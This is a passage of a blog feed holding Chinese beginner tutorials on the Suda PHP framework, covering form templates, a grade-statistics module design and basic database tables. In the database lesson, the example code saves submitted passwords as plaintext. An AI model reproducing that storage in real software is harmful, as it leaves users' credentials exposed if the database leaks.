class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>学号<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"number"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        @foreach ($:fields as $id =&gt; $field) </span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span>&#123;&#123;$field['name']&#125;&#125;<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                @if ($field['type'] == 'text')</span><br><span class="line">                    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"data[&#123;&#123;$id&#125;&#125;]"</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                @elseif ($field['type'] == 'number')</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">name</span>=<span class="string">"data[&#123;&#123;$id&#125;&#125;]"</span> <span class="attr">required</span>&gt;</span> </span><br><span class="line">                @else</span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"data[&#123;&#123;$id&#125;&#125;]"</span> <span class="attr">required</span>&gt;</span> </span><br><span class="line">                @endif</span><br><span class="line">            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">         @endforeach</span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="PHP文件"><a href="#PHP文件" class="headerlink" title="PHP文件"></a>PHP文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TableResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        $tables = app()-&gt;getModuleConfig(app()-&gt;getFileModule(<span class="keyword">__FILE__</span>), <span class="string">'statistic'</span>);</span><br><span class="line">        $tableId = $request-&gt;get(<span class="string">'table_id'</span>);</span><br><span class="line">        <span class="comment">// 判断是否存在ID</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($tables[$tableId])) &#123;</span><br><span class="line">            $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'table'</span>);</span><br><span class="line">            $view-&gt;set(<span class="string">'fields'</span>,$tables[$tableId][<span class="string">'fields'</span>]);</span><br><span class="line">            $view-&gt;set(<span class="string">'name'</span>,$tables[$tableId][<span class="string">'name'</span>]);</span><br><span class="line">            $view-&gt;render();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 显示404界面</span></span><br><span class="line">            hook()-&gt;exec(<span class="string">'system:404'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><ul><li>创建好相关路由页面</li></ul>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 07 成绩统计系统 - 项目设计</title>
      <link href="/2018/08/05/suda-results-statistical-design/"/>
      <url>/2018/08/05/suda-results-statistical-design/</url>
      <content type="html"><![CDATA[<p>本次开始将用一个例子来集合前面我们学习过的东西 - 成绩统计，在开始之前，我们创建一个新项目，之前的老东西就不用了。</p><a id="more"></a><p>准备操作：</p><p>创建一个新项目，访问后，把 app 目录下的 <code>/data</code>  目录删了， <code>modules</code> 下面的 app 模块页删了，创建一个 <code>statistical</code> 模块，目录结构暂时如下：</p><p><img src="1.png" alt=""></p><p><strong>配置文件</strong>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"dxkite/statistical"</span>,</span><br><span class="line">    <span class="attr">"namespace"</span>: <span class="string">"dxkite/statistical"</span>,</span><br><span class="line">    <span class="attr">"authors"</span>: [&#123;</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"dxkite"</span>,</span><br><span class="line">        <span class="attr">"email"</span>: <span class="string">"dxkite@qq.com"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="attr">"import"</span>: &#123;</span><br><span class="line">        <span class="attr">"share"</span>: &#123;</span><br><span class="line">            <span class="attr">"dxkite\\statistical"</span>: <span class="string">"share"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"src"</span>: &#123;</span><br><span class="line">            <span class="attr">"dxkite\\statistical\\response"</span>: <span class="string">"src"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"discription"</span>: <span class="string">"DXkite的成绩统计模块"</span>,</span><br><span class="line">    <span class="attr">"require"</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.0.0"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置好模块名，这里我的模块名是 <code>dxkite/statistical</code> 模块名可以任意命名，但是格式必须是 <code>空间/模块</code> </p><p>命名空间这里我是用 <code>dxkite\statistical</code> 而不是之前的 <code>cn\atd3</code> 了，这些东西都可以自定义</p><p>路由文件：清空路由文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>启用模块</strong>:</p><p>模块一般都是添加上去就可以用，不过我默认指定了可用模块</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"suda-test-app"</span>,</span><br><span class="line">    <span class="attr">"namespace"</span>: <span class="string">"cn\\atd3"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.0-dev"</span>,</span><br><span class="line">    <span class="attr">"application"</span>: <span class="string">"suda\\core\\Application"</span>,</span><br><span class="line">    <span class="attr">"modules"</span>: [<span class="string">"suda"</span>, <span class="string">"app"</span>],</span><br><span class="line">    <span class="attr">"reachable"</span>: [<span class="string">"app"</span>],</span><br><span class="line">    <span class="attr">"language"</span>: <span class="string">"zh-CN"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: &#123;</span><br><span class="line">        <span class="attr">"mode"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"beautify"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">"rewrite"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源配置文件表示：启用 suda 和 app 模块，其中 app  模块可以被访问到，但是现在我们把 app 模块删了，要改成：启用 suda 和 statistical 模块，其中 statistical  模块可以被访问到，顺便把app的名字改下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"dxkite-statistical-app"</span>,</span><br><span class="line">    <span class="attr">"namespace"</span>: <span class="string">"dxkite\\statistical"</span>,</span><br><span class="line">    <span class="attr">"version"</span>: <span class="string">"1.0-dev"</span>,</span><br><span class="line">    <span class="attr">"application"</span>: <span class="string">"suda\\core\\Application"</span>,</span><br><span class="line">    <span class="attr">"modules"</span>: [<span class="string">"suda"</span>, <span class="string">"statistical"</span>],</span><br><span class="line">    <span class="attr">"reachable"</span>: [<span class="string">"statistical"</span>],</span><br><span class="line">    <span class="attr">"language"</span>: <span class="string">"zh-CN"</span>,</span><br><span class="line">    <span class="attr">"url"</span>: &#123;</span><br><span class="line">        <span class="attr">"mode"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"beautify"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">"rewrite"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>在成绩统计的时候，我们会用到那些东西？学号、姓名、成绩。其中对于我们来说，学号是唯一的。在表设计阶段也就可以把学号作为主键。本次在统计的时候我还想添加一个功能，同时创建多个统计单，支持设置统计类型。我本次选择将统计类型作为一个配置存储在配置文件 <code>config/statistic.json</code> 中。</p><h3 id="统计类型设计"><a href="#统计类型设计" class="headerlink" title="统计类型设计"></a>统计类型设计</h3><p>一般来说，统计类型一般为 <code>number</code> 、 <code>string</code> 、 <code>text</code> 分别对应 <code>input =&quot;number&quot;</code> 、<code>input=&quot;text&quot;</code>、<code>textarea</code>。</p><h3 id="表单标题"><a href="#表单标题" class="headerlink" title="表单标题"></a>表单标题</h3><p>一般一个统计页面会有一个标题，所以在配置文件中也要体现出来</p><h3 id="整体配置文件格式"><a href="#整体配置文件格式" class="headerlink" title="整体配置文件格式"></a>整体配置文件格式</h3><p>看配置和逻辑，不难看出表id和学号两个才能构成一个主键</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"table_id_1"</span>: &#123;</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"学生XXX统计表"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">            <span class="attr">"math"</span>: &#123;</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"数学成绩"</span>,</span><br><span class="line">                <span class="attr">"type"</span>: <span class="string">"number"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"english"</span>: &#123;</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"英语成绩"</span>,</span><br><span class="line">                <span class="attr">"type"</span>: <span class="string">"number"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"table_id_2"</span>: &#123;</span><br><span class="line">        <span class="attr">"name"</span>: <span class="string">"学生XXX统计表-2"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">            <span class="attr">"math"</span>: &#123;</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"数学成绩"</span>,</span><br><span class="line">                <span class="attr">"type"</span>: <span class="string">"number"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"english"</span>: &#123;</span><br><span class="line">                <span class="attr">"name"</span>: <span class="string">"英语成绩"</span>,</span><br><span class="line">                <span class="attr">"type"</span>: <span class="string">"number"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数据表设计"><a href="#数据表设计" class="headerlink" title="数据表设计"></a>数据表设计</h2><p>根据现有的分析，数据表设计大概长这样</p><table><thead><tr><th>表段</th><th>类型</th><th>备注</th><th>说明</th></tr></thead><tbody><tr><td>id</td><td>bigint</td><td>PK AUTO</td><td>ID 自动增长,<strong>开发的时候注意给每个表添加ID可以优化效率</strong></td></tr><tr><td>student_id</td><td>varchar</td><td></td><td>学号，字符串类型，长度暂时不定</td></tr><tr><td>table_id</td><td>varchar</td><td></td><td>表id，字符串类型，长度暂时不定</td></tr><tr><td>name</td><td>varchar</td><td></td><td>学生姓名</td></tr><tr><td>data</td><td>text</td><td></td><td>数据域，为了存储不定长的数据，这里我们要处理</td></tr></tbody></table><p>根据如上的表，我们的表文件PHP具体描述应该大致如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">table</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StatisticTable</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 数据表名</span></span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'statistic'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span>&#123;</span><br><span class="line">        $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>,<span class="string">'bigint'</span>,<span class="number">20</span>)-&gt;primary()-&gt;auto()-&gt;comment(<span class="string">'自动增长ID'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'student_id'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>)-&gt;key()-&gt;comment(<span class="string">'学号'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'table_id'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>)-&gt;key()-&gt;comment(<span class="string">'姓名'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'name'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'data'</span>,<span class="string">'text'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字段处理"><a href="#字段处理" class="headerlink" title="字段处理"></a>字段处理</h3><p>Suda 框架提供对数据的预处理，在数据输入前和获取前都可以处理一下，处理对应到字段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">statistical</span>\<span class="title">table</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StatisticTable</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 数据表名</span></span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'statistic'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span>&#123;</span><br><span class="line">        $table-&gt;fields(</span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>,<span class="string">'bigint'</span>,<span class="number">20</span>)-&gt;primary()-&gt;auto()-&gt;comment(<span class="string">'自动增长ID'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'student_id'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>)-&gt;key()-&gt;comment(<span class="string">'学号'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'table_id'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>)-&gt;key()-&gt;comment(<span class="string">'姓名'</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'name'</span>,<span class="string">'varchar'</span>,<span class="number">80</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'data'</span>,<span class="string">'text'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_inputDataField</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_outputDataField</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>_input字段名Field</code> 表示处理输入的字段，<code>_ouput字段名Field</code>表示处理输出的字段，字段名首字母大写，<br>这里，在输入的时候使用 <code>serialize</code> 将任意类型的数据转换成字符串存储在数据库中，<code>unserialize</code> 在我们读取的时候转换回来。</p><h2 id="路由设计"><a href="#路由设计" class="headerlink" title="路由设计"></a>路由设计</h2><p>我们需要几个页面：</p><ul><li>index 页面，显示可以输入的表格数量，提供一个下载链接</li><li>table 页面，显示输入的表格，以及输出结果</li><li>download 页面，提供下载表格的功能</li></ul><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p>实现所以路由和表格</p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 06 引入并使用数据库</title>
      <link href="/2018/08/04/suda-use-database/"/>
      <url>/2018/08/04/suda-use-database/</url>
      <content type="html"><![CDATA[<p>一个网站，没有数据库和有数据库是两样，今天我们来学习把数据持久化到数据库中。<br>准备工作：</p><ul><li>创建一个路由 database 匹配地址 /database、 相应类：<code>cn\atd3\response\DBResponse</code></li><li>创建一个页面模板  database , 并使相应类显示这个模板<a id="more"></a></li></ul><h2 id="添加数据表"><a href="#添加数据表" class="headerlink" title="添加数据表"></a>添加数据表</h2><p>在 Suda 框架中，数据表不需要手动创建，我们在使用的时候继承 <code>suda\archive\Table</code> 类即可。<br>这里我们创建一个数据表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">table</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserTable</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">archive</span>\<span class="title">Table</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// 数据表名</span></span><br><span class="line">        <span class="keyword">parent</span>::__construct(<span class="string">'user'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">onBuildCreator</span><span class="params">($table)</span></span>&#123;</span><br><span class="line">        $table-&gt;fields(</span><br><span class="line">            <span class="comment">// 键名id，类型，长度省略 添加主键(primary)，自动增长(auto) </span></span><br><span class="line">            $table-&gt;field(<span class="string">'id'</span>,<span class="string">'bigint'</span>)-&gt;primary()-&gt;auto(),</span><br><span class="line">            $table-&gt;field(<span class="string">'name'</span>,<span class="string">'varchar'</span>,<span class="number">30</span>),</span><br><span class="line">            $table-&gt;field(<span class="string">'password'</span>,<span class="string">'varchar'</span>, <span class="number">255</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">return</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一般来说，创建一个数据表就是以上代码即可，其中，<code>onBuildCreator</code> 放置数据表构建描述代码。<br>在 <code>__construct</code> 中调用父类的构造函数指定创建的数据表名。具体的函数参考可以找到Suda文件夹下的：  <code>docs/classes/suda/archive/Table.md</code> 文件查看文档 </p><h2 id="创建数据处理类"><a href="#创建数据处理类" class="headerlink" title="创建数据处理类"></a>创建数据处理类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 引用 UserTable </span></span><br><span class="line"><span class="keyword">use</span> <span class="title">cn</span>\<span class="title">atd3</span>\<span class="title">table</span>\<span class="title">UserTable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">suda</span>\<span class="title">core</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DBResponse</span> <span class="keyword">extends</span> \<span class="title">suda</span>\<span class="title">core</span>\<span class="title">Response</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onRequest</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;page(<span class="string">'database'</span>); </span><br><span class="line">        <span class="comment">// 新建数据表对象</span></span><br><span class="line">        $table = <span class="keyword">new</span> UserTable;</span><br><span class="line">        <span class="keyword">if</span> ($request-&gt;hasPost()) &#123;</span><br><span class="line">            <span class="comment">// 插入一条数据</span></span><br><span class="line">            $table-&gt;insert([</span><br><span class="line">                <span class="string">'name'</span> =&gt; $request-&gt;post(<span class="string">'name'</span>),</span><br><span class="line">                <span class="string">'password'</span> =&gt; $request-&gt;post(<span class="string">'password'</span>),</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取数据（ list 方法 可以获取全部数据）</span></span><br><span class="line">        $view-&gt;set(<span class="string">'user'</span>,$table-&gt;list());</span><br><span class="line">        $view-&gt;render();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细心的同学可能发现了，在代码里我好像都没有使用 <code>require</code>，<code>include</code> 啥的，这是框架帮我们自动加载了，<br>比如这个 <code>cn\atd3\table\UserTable</code> 数据表类，框架会自动搜索模板目录，查看模板配置：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">"import": &#123;</span><br><span class="line">    "share": &#123;</span><br><span class="line">        "cn\\atd3": "share"</span><br><span class="line">    &#125;,</span><br><span class="line">    "src": &#123;</span><br><span class="line">        "cn\\atd3\\response": "src"</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在我们模块里面有这样一串代码，这里指定了 <code>cn\atd3</code> 命名空间找文件的路径是模块下的 <code>share</code> 路径，<code>cn\atd3\response</code> 要去 <code>src</code> 路径找。<br>所以，我们 <code>DBResponse.php</code> 文件应该放在 <code>src/DBResponse.php</code>，<code>UserTable.php</code> 应该放在 <code>share/table/UserTable.php</code> 文件下面：</p><p><img src="1.png" alt=""></p><p>在这个处理类中，表我们使用了两个方法：</p><p><code>insert</code> 方法和 <code>list</code> 方法 ,对应的参考文件  <code>docs/classes/suda/archive/Table/insert.md</code>、<code>docs/classes/suda/archive/Table/list.md</code></p><p>一个是插入数据，一个是列出数据，具体都可以看参考文件</p><h2 id="构建界面"><a href="#构建界面" class="headerlink" title="构建界面"></a>构建界面</h2><p>界面我们现在需要有两个功能，才能配上处理文件：</p><ol><li>能够提交POST表单，数据为 <code>name</code> 和 <code>password</code></li><li>能够显示数组列表</li></ol><p>现在的HTML界面如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 